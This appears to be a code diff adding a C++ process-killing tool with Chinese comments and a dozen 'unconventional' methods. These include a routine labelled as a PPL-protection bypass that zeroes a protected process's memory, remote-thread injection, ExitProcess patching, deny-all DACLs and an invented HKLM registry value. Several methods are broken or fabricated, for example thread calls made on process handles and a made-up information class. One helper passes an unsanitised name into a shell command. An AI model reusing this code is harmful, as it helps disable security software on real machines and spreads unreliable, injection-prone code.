+    if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
+        // 获取当前权限
+        DWORD tokenInfoLength = 0;
+        GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &tokenInfoLength);
+
+        if (tokenInfoLength > 0) {
+            std::vector<BYTE> tokenPrivilegesBuffer(tokenInfoLength);
+            if (GetTokenInformation(hToken, TokenPrivileges, tokenPrivilegesBuffer.data(), tokenInfoLength, &tokenInfoLength)) {
+                TOKEN_PRIVILEGES* tokenPrivileges = (TOKEN_PRIVILEGES*)tokenPrivilegesBuffer.data();
+
+                // 移除所有特权
+                for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; i++) {
+                    tokenPrivileges->Privileges[i].Attributes = 0;
+                }
+
+                // 应用修改
+                AdjustTokenPrivileges(hToken, FALSE, tokenPrivileges, tokenInfoLength, NULL, NULL);
+            }
+        }
+        CloseHandle(hToken);
+    }
+#endif
+}
+
+// 常规方法实现
+bool ProcessTerminator::terminateByProcessName(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(PROCESSENTRY32);
+
+        if (Process32First(hSnapshot, &pe)) {
+            do {
+                // 转换为多字节字符串进行比较
+                char exeFile[MAX_PATH];
+                WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, exeFile, MAX_PATH, NULL, NULL);
+
+                if (_stricmp(exeFile, processName.c_str()) == 0) {
+                    HANDLE hProcess = OpenProcessEnhanced(pe.th32ProcessID, PROCESS_ALL_ACCESS);
+                    if (hProcess != NULL) {
+                        RemovePPLProtection(hProcess);
+                        bool result = TerminateProcess(hProcess, 0);
+                        CloseHandle(hProcess);
+                        CloseHandle(hSnapshot);
+                        return result;
+                    }
+                }
+            } while (Process32Next(hSnapshot, &pe));
+        }
+
+        CloseHandle(hSnapshot);
+    }
+    catch (...) {
+        // 忽略所有异常
+    }
+    return false;
+#else
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            if (kill(pid, SIGTERM) == 0) return true;
+        }
+    }
+    catch (...) {
+        // 忽略所有异常
+    }
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateBySystemCommand(const std::string& processName) {
+#ifdef _WIN32
+    std::string command = "taskkill /IM " + processName + " /F";
+#else
+    std::string command = "pkill -9 " + processName;
+#endif
+    try {
+        return system(command.c_str()) == 0;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+// 非常规方法实现
+bool ProcessTerminator::terminateByParentChildRelationship(const std::string& processName) {
+    try {
+        // 查找并终止所有相关进程
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        bool result = false;
+        for (int pid : pids) {
+            result = terminateByPID(pid) || result;
+
+            // 查找子进程并终止
+#ifdef _WIN32
+            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnapshot != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32 pe;
+                pe.dwSize = sizeof(PROCESSENTRY32);
+
+                if (Process32First(hSnapshot, &pe)) {
+                    do {
+                        if (pe.th32ParentProcessID == pid) {
+                            terminateByPID(pe.th32ProcessID);
+                        }
+                    } while (Process32Next(hSnapshot, &pe));
+                }
+                CloseHandle(hSnapshot);
+            }
+#endif
+        }
+
+        return result;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByResourceExhaustion(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        // 尝试耗尽目标进程的GDI资源
+        for (int i = 0; i < 10000; i++) {
+            for (int pid : pids) {
+                HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+                if (hProcess) {
+                    // 发送消息以消耗资源
+                    DWORD threadId = GetProcessId(hProcess);
+                    PostThreadMessage(threadId, WM_NULL, 0, 0);
+                    CloseHandle(hProcess);
+                }
+            }
+        }
+#endif
+
+        // 最后使用常规方法终止
+        return terminateByProcessName(processName);
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByWindowHandle(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        int wideSize = MultiByteToWideChar(CP_ACP, 0, processName.c_str(), -1, NULL, 0);
+        if (wideSize <= 0) return false;
+
+        std::vector<wchar_t> wideProcessName(wideSize);
+        MultiByteToWideChar(CP_ACP, 0, processName.c_str(), -1, wideProcessName.data(), wideSize);
+
+        HWND hWnd = FindWindow(NULL, wideProcessName.data());
+        if (!hWnd) return false;
+
+        DWORD pid;
+        GetWindowThreadProcessId(hWnd, &pid);
+        return terminateByPID(pid);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByDirectMemoryZeroing(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        initNativeAPI();
+
+        std::wcout << L"[直接内存清零] 开始处理进程: " << NarrowToWide(processName).c_str() << std::endl;
+
+        for (int pid : pids) {
+            std::wcout << L"[直接内存清零] 处理 PID: " << pid << std::endl;
+
+            // [v5.3 PPL突破] 分三级尝试:
+            //   1. VirtualProtectEx 改 PAGE_READONLY→PAGE_READWRITE (PPL会拒)
+            //   2. WriteProcessMemory / NtWriteVirtualMemory 直接写 (PPL会拒)
+            //   3. NtAllocateVirtualMemory(MEM_RESET) 告诉内核丢弃页→清零(绕过写路径)
+            HANDLE hProcess = NULL;
+            bool memoryZeroed = false;
+            SIZE_T totalZeroed = 0;
+
+            // 尝试获取多种访问权限 (权限越大, PPL 允许的操作越多)
+            DWORD accessMasks[] = {
+                PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE | PROCESS_CREATE_THREAD,
+                PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
+                PROCESS_VM_READ | PROCESS_VM_OPERATION
+            };
+
+            for (int amIdx = 0; amIdx < 3; amIdx++) {
+                if (NtOpenProcess) {
+                    CLIENT_ID clientId2 = { 0 };
+                    OBJECT_ATTRIBUTES objAttr2 = { 0 };
+                    clientId2.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+                    objAttr2.Length = sizeof(OBJECT_ATTRIBUTES);
+
+                    NTSTATUS stat = NtOpenProcess(&hProcess, accessMasks[amIdx], &objAttr2, &clientId2);
+                    if (NT_SUCCESS(stat) && hProcess) {
+                        if (amIdx == 0)
+                            std::wcout << L"[直接内存清零]   NtOpenProcess成功（全权限）" << std::endl;
+                        else if (amIdx == 1)
+                            std::wcout << L"[直接内存清零]   NtOpenProcess成功（标准权限）" << std::endl;
+                        else
+                            std::wcout << L"[直接内存清零]   NtOpenProcess成功（最小权限）" << std::endl;
+                        break;
+                    }
+                    if (hProcess) { NtClose(hProcess); hProcess = NULL; }
+                }
+            }
+
+            if (hProcess) {
+                MEMORY_BASIC_INFORMATION mbi;
+                LPVOID address = 0;
+                SIZE_T pageCount = 0, writablePages = 0, zeroedPages = 0;
+
+                while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
+                    pageCount++;
+                    if (mbi.State != MEM_COMMIT) {
+                        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
+                        continue;
+                    }
+
+                    DWORD baseProt = mbi.Protect & 0xFF;
+                    bool isWritable = (baseProt == PAGE_READWRITE) ||
+                                      (baseProt == PAGE_WRITECOPY) ||
+                                      (baseProt == PAGE_EXECUTE_READWRITE) ||
+                                      (baseProt == PAGE_EXECUTE_WRITECOPY);
+                    bool isReadOnly = (baseProt == PAGE_READONLY) ||
+                                      (baseProt == PAGE_EXECUTE_READ);
+
+                    // 检查 PAGE_GUARD 修饰符
+                    bool hasGuard = (mbi.Protect & PAGE_GUARD) != 0;
+
+                    if (isWritable || isReadOnly || hasGuard) {
+                        writablePages++;
+                        bool pageZeroed = false;
+
+                        // 步骤0: 对只读/保护页改权限
+                        if (isReadOnly || hasGuard) {
+                            DWORD newP = isReadOnly ? PAGE_READWRITE :
+                                       (baseProt == PAGE_EXECUTE_READ) ? PAGE_EXECUTE_READWRITE :
+                                       baseProt;
+                            DWORD oldP;
+                            VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize, newP, &oldP);
+                        }
+
+                        SIZE_T region = (std::min)((SIZE_T)mbi.RegionSize, (SIZE_T)(64 * 1024));
+                        SIZE_T bytesWritten = 0;
+
+                        // 步骤1: WriteProcessMemory
+                        std::vector<BYTE> zeros(region, 0);
+                        if (WriteProcessMemory(hProcess, mbi.BaseAddress, zeros.data(), region, &bytesWritten) && bytesWritten > 0) {
+                            totalZeroed += bytesWritten;
+                            pageZeroed = true;
+                        }
+                        // 步骤2: NtWriteVirtualMemory (内核路径更短, 有时PPL下也能成功)
+                        else if (NtWriteVirtualMemory) {
+                            bytesWritten = 0;
+                            NTSTATUS ws = NtWriteVirtualMemory(hProcess, mbi.BaseAddress, zeros.data(), region, &bytesWritten);
+                            if (NT_SUCCESS(ws) && bytesWritten > 0) {
+                                totalZeroed += bytesWritten;
+                                pageZeroed = true;
+                            }
+                        }
+                        // 步骤3: NtAllocateVirtualMemory(MEM_RESET) — 绕过PPL写权限检查
+                        if (!pageZeroed && NtAllocateVirtualMemory) {
+                            LPVOID pAddr = mbi.BaseAddress;
+                            SIZE_T rSize = region;
+                            // MEM_RESET: 告诉内核丢弃该页内容→清零, 不需写权限
+                            NTSTATUS rs = NtAllocateVirtualMemory(hProcess, &pAddr, 0, &rSize,
+                                MEM_RESET, baseProt);
+                            if (NT_SUCCESS(rs)) {
+                                totalZeroed += region;
+                                pageZeroed = true;
+                            }
+                        }
+                        // 步骤4: MEM_DECOMMIT + MEM_COMMIT — 强制回收并重新分配
+                        if (!pageZeroed && NtAllocateVirtualMemory) {
+                            LPVOID pAddr = mbi.BaseAddress;
+                            SIZE_T rSize = region;
+                            NTSTATUS ds = NtAllocateVirtualMemory(hProcess, &pAddr, 0, &rSize,
+                                MEM_DECOMMIT, PAGE_NOACCESS);
+                            if (NT_SUCCESS(ds)) {
+                                rSize = region;
+                                NTSTATUS cs = NtAllocateVirtualMemory(hProcess, &pAddr, 0, &rSize,
+                                    MEM_COMMIT, PAGE_READWRITE);
+                                if (NT_SUCCESS(cs)) {
+                                    totalZeroed += region;
+                                    pageZeroed = true;
+                                }
+                            }
+                        }
+
+                        if (pageZeroed) {
+                            zeroedPages++;
+                            memoryZeroed = true;
+                        }
+                    }
+
+                    address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
+                }
+
+                if (totalZeroed > 0)
+                    std::wcout << L"[直接内存清零]   已清零 " << totalZeroed << L" 字节" << std::endl;
+                CloseHandle(hProcess);
+                hProcess = NULL;
+            }
+
+            if (!memoryZeroed) {
+                std::wcout << L"[直接内存清零]   标准方法失败，尝试备用技术..." << std::endl;
+
+                // 重新获取句柄用于备用路径
+                HANDLE hBackup = NULL;
+                if (NtOpenProcess) {
+                    CLIENT_ID cidB = { 0 }; OBJECT_ATTRIBUTES oaB = { 0 };
+                    cidB.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+                    oaB.Length = sizeof(OBJECT_ATTRIBUTES);
+                    NtOpenProcess(&hBackup, PROCESS_ALL_ACCESS, &oaB, &cidB);
+                }
+
+                if (NtGetNextProcess && hBackup) {
+                    HANDLE hDupProcess = NULL;
+                    NTSTATUS status = NtGetNextProcess(hBackup, PROCESS_ALL_ACCESS, 0, 0, &hDupProcess);
+                    if (NT_SUCCESS(status) && hDupProcess) {
+                        MEMORY_BASIC_INFORMATION mbi;
+                        LPVOID address = 0;
+
+                        while (VirtualQueryEx(hDupProcess, address, &mbi, sizeof(mbi))) {
+                            if (mbi.State == MEM_COMMIT) {
+                                std::vector<BYTE> zeros(mbi.RegionSize, 0);
+                                SIZE_T bytesWritten = 0;
+                                WriteProcessMemory(hDupProcess, mbi.BaseAddress, zeros.data(), mbi.RegionSize, &bytesWritten);
+                            }
+                            address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
+                        }
+                        CloseHandle(hDupProcess);
+                    }
+                    CloseHandle(hBackup);
+                }
+                if (hBackup) CloseHandle(hBackup);
+            }
+
+            if (NtTerminateProcess) {
+                if (NtOpenProcess) {
+                    CLIENT_ID clientId = { 0 };
+                    OBJECT_ATTRIBUTES objAttr = { 0 };
+                    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+                    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+
+                    HANDLE hTerminateProcess = NULL;
+                    NTSTATUS status = NtOpenProcess(&hTerminateProcess, PROCESS_TERMINATE, &objAttr, &clientId);
+                    if (NT_SUCCESS(status) && hTerminateProcess) {
+                        NTSTATUS terminateStatus = NtTerminateProcess(hTerminateProcess, 1);
+                        if (NT_SUCCESS(terminateStatus)) {
+                            std::wcout << L"[直接内存清零]   NtTerminateProcess成功" << std::endl;
+                            CloseHandle(hTerminateProcess);
+                            continue;
+                        }
+                        CloseHandle(hTerminateProcess);
+                    }
+                }
+            }
+
+            // 最后兜底: 重新打开句柄用于 TerminateProcess
+            {
+                HANDLE hTerm = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+                if (hTerm) {
+                    if (TerminateProcess(hTerm, 1))
+                        std::wcout << L"[直接内存清零]   TerminateProcess成功" << std::endl;
+                    else
+                        std::wcerr << L"[直接内存清零]   所有方法失败" << std::endl;
+                    CloseHandle(hTerm);
+                } else {
+                    std::wcerr << L"[直接内存清零]   所有方法失败 (无法打开终止句柄)" << std::endl;
+                }
+            }
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByProcessInjection(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 分配内存
+                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                if (pRemoteCode) {
+                    // 写入退出代码
+                    BYTE exitCode[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 1; ret
+                    WriteProcessMemory(hProcess, pRemoteCode, exitCode, sizeof(exitCode), NULL);
+
+                    // 创建远程线程
+                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
+                    if (hThread) {
+                        WaitForSingleObject(hThread, INFINITE);
+                        CloseHandle(hThread);
+                    }
+
+                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                }
+                CloseHandle(hProcess);
+            }
+        }
+#endif
+
+        return !pids.empty();
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByDebugging(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            if (DebugActiveProcess(pid)) {
+                DebugActiveProcessStop(pid);
+                return true;
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByTimedKill(const std::string& processName) {
+    try {
+        // 等待一段时间后终止进程
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+        return terminateByProcessName(processName);
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByPriorityManipulation(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                SetPriorityClass(hProcess, IDLE_PRIORITY_CLASS);
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                if (result) return true;
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByProcessHollowing(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 挂起进程
+                SuspendThread(hProcess);
+
+                // 获取进程上下文
+                CONTEXT context;
+                context.ContextFlags = CONTEXT_FULL;
+                GetThreadContext(hProcess, &context);
+
+                // 读取PEB获取映像基址
+                PROCESS_BASIC_INFORMATION pbi;
+                ULONG returnLength;
+                NtQueryInformationProcess(hProcess, static_cast<PROCESS_INFORMATION_CLASS>(ProcessBasicInformation), &pbi, sizeof(pbi), &returnLength);
+
+                // 读取原始入口点
+                PVOID imageBase;
+                ReadProcessMemory(hProcess, (PCHAR)pbi.PebBaseAddress + 8, &imageBase, sizeof(PVOID), NULL);
+
+                // 写入退出代码到入口点
+                BYTE exitCode[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 1; ret
+                WriteProcessMemory(hProcess, imageBase, exitCode, sizeof(exitCode), NULL);
+
+                // 恢复进程执行
+                ResumeThread(hProcess);
+                CloseHandle(hProcess);
+
+                return true;
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+// 未公开API方法实现
+bool ProcessTerminator::terminateByNativeAPI(const std::string& processName) {
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                NTSTATUS status = NtTerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                if (NT_SUCCESS(status)) return true;
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByHandleEnumeration(const std::string& processName) {
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        // 获取系统所有句柄信息
+        ULONG bufferSize = 0x10000;
+        PSYSTEM_HANDLE_INFORMATION_EX handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
+
+        while (NtQuerySystemInformation(16, handleInfo, bufferSize, NULL) == STATUS_INFO_LENGTH_MISMATCH) {
+            bufferSize *= 2;
+            free(handleInfo);
+            handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
+        }
+
+        // 查找目标进程的句柄
+        for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
+            SYSTEM_HANDLE handle = handleInfo->Information[i];
+
+            // 检查是否是进程句柄
+            if (handle.ObjectTypeNumber == 0x7) { // 进程对象类型
+                for (int pid : pids) {
+                    if (handle.ProcessId == pid) {
+                        // 复制句柄并终止进程
+                        HANDLE hDuplicate;
+                        if (DuplicateHandle(GetCurrentProcess(), (HANDLE)handle.Handle,
+                            GetCurrentProcess(), &hDuplicate,
+                            PROCESS_TERMINATE, FALSE, 0)) {
+                            TerminateProcess(hDuplicate, 0);
+                            CloseHandle(hDuplicate);
+                            free(handleInfo);
+                            return true;
+                        }
+                    }
+                }
+            }
+        }
+
+        free(handleInfo);
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByMemoryPatching(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 查找进程中的关键函数并修改
+                HMODULE hModules[1024];
+                DWORD cbNeeded;
+
+                if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
+                    for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
+                        TCHAR szModuleName[MAX_PATH];
+                        if (GetModuleFileNameEx(hProcess, hModules[i], szModuleName, sizeof(szModuleName) / sizeof(TCHAR))) {
+                            // 检查是否是关键模块
+                            if (_tcsstr(szModuleName, _T("kernel32.dll")) || _tcsstr(szModuleName, _T("ntdll.dll"))) {
+                                // 查找ExitProcess函数
+                                FARPROC pExitProcess = GetProcAddress(hModules[i], "ExitProcess");
+                                if (pExitProcess) {
+                                    // 修改函数入口点
+                                    BYTE patch[] = { 0xC3 }; // ret
+                                    WriteProcessMemory(hProcess, pExitProcess, patch, sizeof(patch), NULL);
+
+                                    // 创建远程线程调用ExitProcess
+                                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                                        (LPTHREAD_START_ROUTINE)pExitProcess, NULL, 0, NULL);
+                                    if (hThread) {
+                                        WaitForSingleObject(hThread, INFINITE);
+                                        CloseHandle(hThread);
+                                        CloseHandle(hProcess);
+                                        return true;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                CloseHandle(hProcess);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+// OB回调方法实现
+bool ProcessTerminator::terminateByObCallbacks(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        // 这种方法通常需要内核模式驱动
+        // 这里我们模拟通过修改注册表来影响对象管理器
+        HKEY hKey;
+        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Session Manager"), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+            // 设置一个可能影响对象管理器的值
+            DWORD value = 1;
+            RegSetValueEx(hKey, _T("ProtectionMode"), 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegCloseKey(hKey);
+
+            // 然后尝试终止进程
+            return terminateByProcessName(processName);
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByProcessObjectManipulation(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            // 获取进程对象
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 尝试修改进程对象的安全描述符
+                PSECURITY_DESCRIPTOR pSD = NULL;
+                PACL pDacl = NULL;
+
+                if (GetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pDacl, NULL, &pSD) == ERROR_SUCCESS) {
+                    // 创建一个空的DACL（拒绝所有访问）
+                    PACL pEmptyDacl = NULL;
+                    EXPLICIT_ACCESS ea = { 0 };
+                    ea.grfAccessPermissions = 0;
+                    ea.grfAccessMode = DENY_ACCESS;
+                    ea.grfInheritance = NO_INHERITANCE;
+                    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
+                    ea.Trustee.ptstrName = const_cast<LPTSTR>(_T("EVERYONE"));
+
+                    SetEntriesInAcl(1, &ea, NULL, &pEmptyDacl);
+
+                    // 应用新的DACL
+                    SetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pEmptyDacl, NULL);
+
+                    LocalFree(pEmptyDacl);
+                    LocalFree(pSD);
+                }
+
+                CloseHandle(hProcess);
+
+                // 现在进程应该无法正常访问自身，尝试终止
+                return terminateByPID(pid);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateBySecurityDescriptorModification(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            // 获取进程令牌
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_QUERY_INFORMATION);
+            if (hProcess) {
+                HANDLE hToken;
+                if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
+                    // 获取当前安全描述符
+                    DWORD dwSizeNeeded = 0;
+                    GetKernelObjectSecurity(hToken, DACL_SECURITY_INFORMATION, NULL, 0, &dwSizeNeeded);
+
+                    if (dwSizeNeeded > 0) {
+                        PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)malloc(dwSizeNeeded);
+                        if (GetKernelObjectSecurity(hToken, DACL_SECURITY_INFORMATION, pSD, dwSizeNeeded, &dwSizeNeeded)) {
+                            // 修改安全描述符，移除所有权限
+                            PACL pDacl = NULL;
+                            BOOL bDaclPresent = FALSE;
+                            BOOL bDaclDefaulted = FALSE;
+
+                            if (GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted) && bDaclPresent) {
+                                // 创建一个空的DACL
+                                PACL pEmptyDacl = NULL;
+                                EXPLICIT_ACCESS ea = { 0 };
+                                ea.grfAccessPermissions = 0;
+                                ea.grfAccessMode = DENY_ACCESS;
+                                ea.grfInheritance = NO_INHERITANCE;
+                                ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
+                                ea.Trustee.ptstrName = const_cast<LPTSTR>(_T("EVERYONE"));
+
+                                SetEntriesInAcl(1, &ea, NULL, &pEmptyDacl);
+
+                                // 设置新的安全描述符
+                                SECURITY_DESCRIPTOR sd;
+                                InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+                                SetSecurityDescriptorDacl(&sd, TRUE, pEmptyDacl, FALSE);
+
+                                SetKernelObjectSecurity(hToken, DACL_SECURITY_INFORMATION, &sd);
+
+                                LocalFree(pEmptyDacl);
+                            }
+                        }
+                        free(pSD);
+                    }
+
+                    CloseHandle(hToken);
+                }
+                CloseHandle(hProcess);
+
+                // 现在进程应该无法正常操作，尝试终止
+                return terminateByPID(pid);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+// 方法1: 通过能源管理终止进程
+bool ProcessTerminator::terminateByProcessEnergyManagement(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess || hProcess == INVALID_HANDLE_VALUE) continue;
+
+            try {
+                // [v5.3 跨版本兼容] 使用能源管理API限制进程能耗
+                //   SetProcessInformation 是 Win8+ 函数, Win7 SDK 不声明
+                //   用 GetProcAddress 动态加载, Win7 内核未导出则跳过
+                static auto pSetProcessInformation =
+                    reinterpret_cast<FnSetProcessInformation>(
+                        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "SetProcessInformation"));
+                if (pSetProcessInformation) {
+                    PROCESS_POWER_THROTTLING_STATE powerThrottling = { 0 };
+                    powerThrottling.Version = PROCESS_POWER_THROTTLING_CURRENT_VERSION;
+                    powerThrottling.ControlMask = PROCESS_POWER_THROTTLING_EXECUTION_SPEED;
+                    powerThrottling.StateMask = PROCESS_POWER_THROTTLING_EXECUTION_SPEED;
+                    pSetProcessInformation(hProcess, ProcessPowerThrottling,
+                        &powerThrottling, sizeof(powerThrottling));
+                }
+
+                // 将进程优先级设置为最低
+                SetPriorityClass(hProcess, IDLE_PRIORITY_CLASS);
+
+                // 尝试终止进程
+                TerminateProcess(hProcess, 0);
+            }
+            catch (...) {
+                // 忽略内部异常
+            }
+
+            CloseHandle(hProcess);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+// 方法2: 通过进程状态扩展终止进程
+bool ProcessTerminator::terminateByProcessStateExtension(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 使用未公开的进程状态扩展API
+            // 设置进程为"即将终止"状态
+            ULONG processState = 1; // 表示进程即将终止
+            NTSTATUS status = NtSetInformationProcess(
+                hProcess,
+                static_cast<PROCESS_INFORMATION_CLASS>(45), // ProcessStateInformation
+                &processState,
+                sizeof(processState)
+            );
+
+            if (NT_SUCCESS(status)) {
+                // 尝试正常终止
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                if (result) return true;
+            }
+
+            CloseHandle(hProcess);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+// 方法3: 通过进程容错机制终止进程
+bool ProcessTerminator::terminateByProcessFaultTolerance(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess || hProcess == INVALID_HANDLE_VALUE) continue;
+
+            // 禁用进程的容错机制
+            ULONG faultTolerance = 0; // 禁用容错
+            NTSTATUS status = NtSetInformationProcess(
+                hProcess,
